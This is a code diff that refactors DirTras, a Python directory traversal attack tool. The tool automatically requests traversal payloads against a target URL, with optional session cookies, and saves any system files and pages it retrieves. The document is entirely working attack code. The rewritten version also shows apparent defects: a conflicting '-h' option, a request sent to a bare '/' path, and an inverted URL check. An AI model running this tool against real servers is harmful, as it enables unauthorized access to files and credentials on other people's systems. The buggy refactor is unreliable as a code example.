@@ -1,434 +1,222 @@
-# Dirtras - By Nate-one - https://github.com/Nate-one
-# python -m pip install requests
+# DirTras Directory Traversal Tool
+# Github: https://github.com/nathan-watson-uk
+
 
 from text_data import help_info, bug_info, run_info
-
 from urllib.parse import urlparse
 import requests
 import sys
 import os
-import getopt
+import argparse
 import time
 import re
 
-# Define flag options
-short_opts = "hu:o:p:d:f:x:bc:"
 
-long_opts = ["help", "url=", "target-os=", "port=", "delay=",
-             "file=", "proxy=", "host-system=", "bugs", "output=", "cookie=", "cookie-name=", "L1", "L2", "L3"]
-
-args = sys.argv
-
-argument_list = args[1:]
-
-file = ""
-output = ""
-
-cookie = ""
-cookie_name = ""
-session_cookie = ""
-
-target_os = "linux"
-host_sys = "linux"
-
-url = ""
-fail_traversal = "../thisdoesntwork"
-traversal_data_list = []
-
-level = "L1"
-
-# Keeps log of file that have been found
-file_found_list = []
-html_found_list = []
-
-
-iter_count = 0
-port = 80
-delay = 0.02
-
-https = False
-file_check = False
-level_check = False
-output_check = False
-url_check = False
-
-
+# Function to check if the URL points to a downloadable resource
 def is_downloadable(u):
     """
     Does the url contain a downloadable resource
     """
     try:
+        # Send a HEAD request to the URL
         head = requests.head(u, allow_redirects=True)
     except requests.exceptions.ConnectionError as err:
+        # Exit if there's a connection error
         sys.exit(f"Connection Error | {err} | To prevent this try to increase the delay between requests")
 
-    header = head.headers
-    content_type = header.get('content-type')
+    # Get the content type from the headers
+    content_type = head.headers.get('content-type', '').lower()
 
-    if "text" in content_type.lower():
-        return False
-
-    if "html" in content_type.lower():
-        return False
-
-    return True
+    # Return True if the content type is not text or HTML
+    return not ("text" in content_type or "html" in content_type)
 
 
+# Function to make a GET request, optionally with cookies
 def get_request(s, u, c=None):
-    if not c:
-        return s.get(u)
+    return s.get(u, cookies=c) if c else s.get(u)
 
-    else:
-        return s.get(u, cookies=c)  # Sends request with cookie
 
-
-print(run_info)
-
-try:
-    arguments, values = getopt.getopt(argument_list, short_opts, long_opts)
-
-except getopt.error as error:
-    sys.exit(f"{error}\n")
-
-# Get arg/val from terminal
-# Assign variables to each one and do basic checks
-
-for arg, val in arguments:
-
-    if arg in ("-h", "--help"):
-        print(help_info)
-
-        if len(arguments) <= 1:  # Exits if help is the only flag
-            sys.exit()
-
-    elif arg in ("-b", "--bugs"):
-        print(bug_info)
-
-        if len(arguments) <= 1:
-            sys.exit()
-
-    elif arg in ("-u", "--url"):
-        url, url_check = val, True
-
-        if url[-1:] == "=":  # Last character should be =
-            continue
-        try:
-            url = url[:(url.index("=") + 1)]  # Tries to strip url to get = to last character position
-
-        except ValueError:
-            print(f"Looks like it might not be vulnerable...")
-
-    elif arg == "--target-os":
-        target_os = val.lower()
-        if target_os in ("linux", "windows"):
-            continue
-        else:
-            sys.exit(f"Invalid OS - {target_os} \n\nUse either \'Linux\' or \'Windows\'")  # Exit if invalid OS defined
-
-    elif arg in ("-x", "--proxy"):
-
-        proxy = val
-
-    elif arg in ("-p", "--port"):
-        try:
-            port = int(val)
-            continue
-        except ValueError as error:
-            sys.exit("Error whilst setting port - {error} \n\nUser an integer arguement")
-
-    elif arg in ("-d", "--delay"):
-        try:
-            delay = int(val)
-        except ValueError as error:
-            sys.exit(f"Error whilst setting delay - {error} \n\nUse an integer arguement")
-        continue
-
-    elif arg in ("-f", "--file"):
-        file, file_check = val, True
-        print(file_check)
-        continue
-
-    elif arg in ("-o", "--output"):
-        output, output_check = val, True
-
-    elif arg in ("-c", "--cookies"):
-        cookie = val
-        if "," in cookie:
-            cookie = cookie.split(",")
-
-    elif arg == "--cookie-name":
-        cookie_name = val
-        if "," in cookie_name:
-            cookie_name = cookie_name.split(",")
-
-    elif arg == "--host-system":
-        if val.lower() in ("linux", "windows"):
-            host_sys = val.lower()
-        else:
-            sys.exit("Error whilst setting host system | Use \'linux\' or \'windows\'")
-
-    elif arg in ("--L1", "--L2", "--L3"):
-        level_check, level = True, arg.replace("--", "")
-
-
-# Check that certain flags have been called
-
-if not file_check and not level_check:
-    sys.exit("Directory Traversal Failed - No File Specified | Use -f, --file or --L1, --L2, --L3")
-
-if not url_check:
-    sys.exit("Directory Traversal Failed - No URL Specified | Use -u or --url")
-
-# Creates an output folder if one isn't given
-if not output_check:
-
-    # Changes default output directory depending on OS
-    if host_sys == "windows":
-        output, output_check = fr"{os.getcwd()}\output", True
-
-    else:
-        output, output_check = f"{os.getcwd()}/output", True
-
-    print(f"No Output Folder Specified | Creating a new folder at {output} | Ctrl + C to suspend | Use -o or --output")
-
-    time.sleep(5)
-
-# Advises that https is not usually on port 80
-
-if "https" in url and port == 80:
-    print("It seems you're going against convention and asking for https while using port 80? Continuing...")
-    time.sleep(3)
-
-# Recommends increased delay
-
-if delay < 0.02:
-    print("It is suggested that you use a delay value higher than 0.02 to prevent ephemeral port exhaustion")
-    time.sleep(1)
-
-# Checks cookie name exists if a cookie is given
-
-if not cookie_name and cookie:
-    sys.exit("You must define the name of the cookie when using session cookies e.g PHPSESSID")
-
-# Checks cookie input and sets session cookie dictionary
-
-if cookie_name and cookie:
-    session_cookie = {}
-    # Advises that number of cookies and cookie names
-    if len(cookie) != len(cookie_name):
-        sys.exit("You must provide the same number of cookie names to cookies.")
-
-    # If there's only one cookie name / cookie set the variable manually
-    if (len(cookie) and len(cookie_name)) == 1:
-        session_cookie = {cookie_name: cookie}
-
-    else:
-        # Uses split cookie names and cookies to create cookie dictionary
-        for i in range(len(cookie_name)):
-            session_cookie[cookie_name[i]] = cookie[i]
-
-
-# Attempt to create output directories
-
-try:
-    if host_sys == "windows":
-        os.mkdir(f"{output}")
-        os.mkdir(fr"{output}\html")
-        os.mkdir(fr"{output}\downloaded")
-
-    else:
-        os.mkdir(f"{output}")
-        os.mkdir(f"{output}/html")
-        os.mkdir(f"{output}/downloaded")
-
-except FileExistsError as error:
-    print(f"Folder {output} already exists.  Continuing...")
-    time.sleep(1)
-
-
-# If levels are being used | find their directory and use it as file var
-if level_check:
-
-    if host_sys == "windows":
-        file = f"{os.path.dirname(os.path.realpath(__file__))}\\content\\{level}.txt"
-
-    else:
-        file = f"{os.path.dirname(os.path.realpath(__file__))}/content/{level}.txt"
-
-# Creates os_file var | directories to search for
-if host_sys == "windows":
-    os_file = f"{os.path.dirname(os.path.realpath(__file__))}\\content\\{target_os}_files.txt"
-
-else:
-    os_file = f"{os.path.dirname(os.path.realpath(__file__))}/content/{target_os}_files.txt"
-
-with open(file, "r") as traverse_file, open(os_file, "r") as interest_dirs:
-
-    session = requests.session()
-
-    # Read files to remove the need to change the pointer
-    list_of_traversal_techniques = traverse_file.readlines()
-    list_of_directories = interest_dirs.readlines()
-
-    # Gets the number of files that are supposed to be retrieved
-    files_to_get = len(list_of_directories)
-
-    # Counts number of files found
-    file_counter = 0
-
-    # Calculates number of iterations for user
-    num_of_iterations = len(list_of_traversal_techniques) * len(list_of_directories)
-
-    # By using a traversal directory that is going to fail
-    # we can find the byte length of what a failed traversal would be
-    # which reduces the need for manual review of thousands of files
-
-    fail_url = url + fail_traversal  # Creates the url to fail
-
+# Function to create output directories if they do not exist
+def create_output_dirs(output):
     try:
+        os.makedirs(os.path.join(output, "html"))  # Create 'html' directory
+        os.makedirs(os.path.join(output, "downloaded"))  # Create 'downloaded' directory
+    except FileExistsError:
+        # Print a message if the directories already exist
+        print(f"Folder {output} already exists. Continuing...")
+        time.sleep(1)
 
-        failed_traversal = get_request(session, fail_url, session_cookie)
 
-    except Exception as error:
-        sys.exit(f"Failed To Get Failed Traversal Content For Comparison | {error}")
+# Main function to execute the script
+def main():
+    # Set up argument parser
+    parser = argparse.ArgumentParser(description="Directory Traversal Tool")
+    parser.add_argument("-u", "--url", required=True, help="Target URL")
+    parser.add_argument("--target-os", default="linux", choices=["linux", "windows"], help="Target operating system")
+    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
+    parser.add_argument("-d", "--delay", type=float, default=0.02, help="Delay between requests")
+    parser.add_argument("-f", "--file", help="File containing traversal techniques")
+    parser.add_argument("-o", "--output", help="Output directory")
+    parser.add_argument("-c", "--cookies", help="Cookies for session")
+    parser.add_argument("--cookie-name", help="Name of the cookies")
+    parser.add_argument("--host-system", default="linux", choices=["linux", "windows"], help="Host system")
+    parser.add_argument("-b", "--bugs", action="store_true", help="Print Bug Information")
+    parser.add_argument("--L1", action="store_true", help="Use level 1 techniques")
+    parser.add_argument("--L2", action="store_true", help="Use level 2 techniques")
+    parser.add_argument("--L3", action="store_true", help="Use level 3 techniques")
+    parser.add_argument("-h", action="store_true", help="Usage Help Menu")
 
-    # Get byte length of what a failed traversal would be
-    failed_traversal_content_len = len(failed_traversal.content)
+    args = parser.parse_args()
 
-    # Iterate through different traversal techniques
-    for traversal_technique in list_of_traversal_techniques:
+    # Print bug information and exit if the --bugs flag is used
+    if args.bugs:
+        print(bug_info)
+        sys.exit()
 
-        # Iterate through os relevant directories
-        for directory_to_try in list_of_directories:
+    if args.h:
+        print(help_info)
+        sys.exit()
 
-            # Delay and count here isntead of at the end of every if statement
-            time.sleep(delay)
-            iter_count += 1
+    # Ensure the URL ends with '=' if it is meant to have query parameters
+    if args.url[-1] == "=":
+        args.url = args.url[:args.url.index("=") + 1]
 
-            # Removes / start from the directory so it isn't duplicated
-            if directory_to_try[:1] in ("/", "\\"):
-                directory_to_try = directory_to_try[1:]
+    # Initialise session cookies if provided
+    session_cookie = {}
+    if args.cookies and args.cookie_name:
+        cookies = args.cookies.split(",")
+        cookie_names = args.cookie_name.split(",")
+        if len(cookies) != len(cookie_names):
+            sys.exit("You must provide the same number of cookie names as cookies.")
+        session_cookie = dict(zip(cookie_names, cookies))
+    elif args.cookies:
+        sys.exit("You must define the name of the cookie when using session cookies e.g PHPSESSID")
 
-            # Creates the traversal directory/interest file and removes trailing \n
-            directory_os_dir = fr"{traversal_technique[:-1]}"
-            directory_os_dir = re.sub("{FILE}|{FILE", f"{directory_to_try[:-1]}", directory_os_dir)
+    # Set output directory
+    output = args.output or os.path.join(os.getcwd(), "output")
+    create_output_dirs(output)
 
-            # Create urllib parse object
-            parsed_url = urlparse(url)
-            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"  # Scheme + Hostname
+    # Warn if using HTTPS with port 80
+    if "https" in args.url and args.port == 80:
+        print("HTTPS included in supplied URL but using port 80? Continuing...")
+        time.sleep(3)
 
-            # Creates url with traversel/directory
+    # Suggest increasing delay to prevent ephemeral port exhaustion
+    if args.delay < 0.02:
+        print("Considering using a delay higher than 0.02 to prevent ephemeral port exhaustion")
+        time.sleep(1)
 
-            url_directory_built = f"{url[len(base_url):]}{directory_os_dir}"
+    # Determine the file containing traversal techniques
+    file = args.file or os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{args.target_os}_files.txt")
 
-            # Creates final url
-            built_url = f"{url[:len(base_url) - 1]}:{port}/{url_directory_built}"
+    # Determine the level of techniques to use
+    if args.L1:
+        level = "L1"
+    elif args.L2:
+        level = "L2"
+    elif args.L3:
+        level = "L3"
+    else:
+        level = None
 
-            # Attempt to send request and handle exception
-            try:
-                if not cookie:
-                    dir_traversal_target = session.get(built_url, timeout=3)
+    # Override file if a level is specified
+    if level:
+        file = os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{level}.txt")
 
-                else:
-                    # Sends request with cookie
-                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)
+    # Open files containing traversal techniques and directories of interest
+    with open(file, "r") as traverse_file, open(
+            os.path.join(os.path.dirname(os.path.realpath(__file__)), f"content/{args.target_os}_files.txt"),
+            "r") as interest_dirs:
+        session = requests.Session()
+        list_of_traversal_techniques = traverse_file.readlines()
+        list_of_directories = interest_dirs.readlines()
+        files_to_get = len(list_of_directories)
 
-            except Exception as error:
-                session = requests.session()
-                print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get}"
-                      f" | HTTP Error - {error} | ", end="")
-                print(f"Current URL: {built_url[0:80]}... ", end="")
-                print("", end="\r", flush=True)
-                continue
+        # Test the base URL length and non-existent URL length
+        # These content lengths will be used to ignore false positives
+        non_existent_url_path = args.url + "../thisdoesntwork"
+        base_url_path = "/"
 
-            # Display current stats - URL, Status, Length and Iteration
+        # Get the content length of the base URL and non-existent URL and store them in invalid_traversal_lengths list
+        base_path_request = get_request(session, base_url_path, session_cookie)
+        non_existent_path_request = get_request(session, non_existent_url_path, session_cookie)
 
-            print(f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | "
-                  f"Length - {len(dir_traversal_target.content)} | ", end="")
-            print(f"Current URL: {built_url[0:80]}... ", end="")
-            print("", end="\r", flush=True)
+        invalid_traversal_lengths = [len(base_path_request.content), len(non_existent_path_request.content)]
 
-            # The following takes the current URL and checks
+        # Initialise counters and lists for found files and HTML content
+        iter_count = 0
+        file_counter = 0
+        num_of_iterations = len(list_of_traversal_techniques) * len(list_of_directories)
 
-            if is_downloadable(built_url):
+        # Initialise lists for discovered files and HTML content
+        file_found_list = []
+        html_found_list = []
 
-                # Get content disposition from header and build file name from it
-                # By using content-disposition it removes the need to create filenames based on target OS
+        # Iterate through traversal techniques and directories
+        for traversal_technique in list_of_traversal_techniques:
+            for directory_to_try in list_of_directories:
+                time.sleep(args.delay)  # Delay between requests
+                iter_count += 1
 
-                file_download_name = dir_traversal_target.headers.get('content-disposition')
-                file_download_name = re.sub(r"[^A-Za-z0-9]+", "", file_download_name)
+                # Clean up directory strings
+                directory_to_try = directory_to_try.lstrip("/\\")
+                directory_os_dir = re.sub("{FILE}|{FILE", f"{directory_to_try.strip()}", traversal_technique.strip())
+                parsed_url = urlparse(args.url)
+                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}/"
+                url_directory_built = f"{args.url[len(base_url):]}{directory_os_dir}"
+                built_url = f"{args.url[:len(base_url) - 1]}:{args.port}/{url_directory_built}"
 
-                # If the content is empty continue
-                if len(dir_traversal_target.content) == 0:
-                    continue
-
-                # Skip files that have already been found
-                if (file_download_name, len(dir_traversal_target.content)) in file_found_list:
-                    continue
-
-                file_found_list.append((file_download_name, len(dir_traversal_target.content)))
-
-                # Save downloadable content to downloaded folder
-
-                if host_sys == "windows":
-
-                    # Windows directory formatting
-                    open(fr"{output}\\downloaded\\{file_download_name}_{iter_count}.txt",
-                         "wb").write(dir_traversal_target.content)
-
-                    file_counter += 1
-                    continue
-
-                else:
-
-                    # Linux directory formatting
-                    open(f"{output}/downloaded/{file_download_name}_{iter_count}.txt".replace("filename", ""),
-                         "wb").write(dir_traversal_target.content)
-
-                    file_counter += 1
-                    continue
-
-            # If the traversal failed, continue
-            if len(dir_traversal_target.content) == failed_traversal_content_len:
-                continue
-
-            # Save content to html folder with specific name / formatting
-            else:
-
-                # If the returned content is empty continue
-                if len(dir_traversal_target.content) == 0:
-                    continue
-
-                # If the content has already been found, skip
-                if directory_to_try in html_found_list:
-                    continue
-
-                html_found_list.append(directory_to_try)  # Append the file that has been found
-
-                #  Creates filename depending on target OS
-
-                if target_os == "windows":
-                    # Reduces need to chain multiple replace lines
-                    os_dir_file = directory_to_try.split(r"\\")[-1].rstrip("\n")
-                    os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", os_dir_file)
-
-                else:
-                    # For Linux
-                    os_dir_file = directory_to_try.rstrip("\n")
-                    os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", os_dir_file)
-
-                # Create directory filenames for specific host operating system
-                win_dir_filename = fr"{output}\\html\\{os_dir_file}_content_{iter_count}.html".replace("filename", "")
-                linux_dir_filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html".replace("filename", "")
-
+                # Attempt to make a request to the built URL
                 try:
-                    if host_sys == "windows":
-                        open(win_dir_filename, "wb").write(dir_traversal_target.content)
-                        file_counter += 1
+                    dir_traversal_target = session.get(built_url, cookies=session_cookie, timeout=3)
+                except Exception as error:
+                    session = requests.Session()  # Reset session on error
+                    print(
+                        f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | HTTP Error - {error} | ",
+                        end="")
+                    print(f"Current URL: {built_url[:80]}... ", end="")
+                    continue
 
-                    else:
-                        open(linux_dir_filename, "wb").write(dir_traversal_target.content)
-                        file_counter += 1
+                print(
+                    f"Current Iteration: {iter_count}/{num_of_iterations} | {file_counter}/{files_to_get} | Length - {len(dir_traversal_target.content)} | ",
+                    end="")
+                print(f"Current URL: {built_url[:80]}... ", end="")
 
-                except OSError as error:
-                    sys.exit(f"OS Error Occurred | {error} | Maybe you need to set --host-system?")
+                # Check if the URL points to a downloadable resource
+                if is_downloadable(built_url):
+                    file_download_name = re.sub(r"[^A-Za-z0-9]+", "",
+                                                dir_traversal_target.headers.get('content-disposition', ''))
+                    if not dir_traversal_target.content:
+                        continue
+                    if (file_download_name, len(dir_traversal_target.content)) in file_found_list:
+                        continue
+                    file_found_list.append((file_download_name, len(dir_traversal_target.content)))
+
+                    # Save the downloaded file
+                    filename = f"{output}/downloaded/{file_download_name}_{iter_count}.txt" if args.host_system == "linux" else fr"{output}\downloaded\{file_download_name}_{iter_count}.txt"
+                    with open(filename, "wb") as f:
+                        f.write(dir_traversal_target.content)
+                    file_counter += 1
+                    continue
+
+                # Skip if the content length matches the failed traversal response
+                if len(dir_traversal_target.content) in invalid_traversal_lengths:
+                    continue
+
+                # Skip if the directory content is empty or already found
+                if not dir_traversal_target.content or directory_to_try in html_found_list:
+                    continue
+
+                # Save the HTML content found
+                html_found_list.append(directory_to_try)
+                os_dir_file = re.sub(r"[^A-Za-z0-9]+", "", directory_to_try.strip())
+                filename = f"{output}/html/{os_dir_file}_content_{iter_count}.html" if args.host_system == "linux" else fr"{output}\html\{os_dir_file}_content_{iter_count}.html"
+                with open(filename, "wb") as f:
+                    f.write(dir_traversal_target.content)
+                file_counter += 1
+
+
+# Entry point
+if __name__ == "__main__":
+    print(run_info)
+    main()
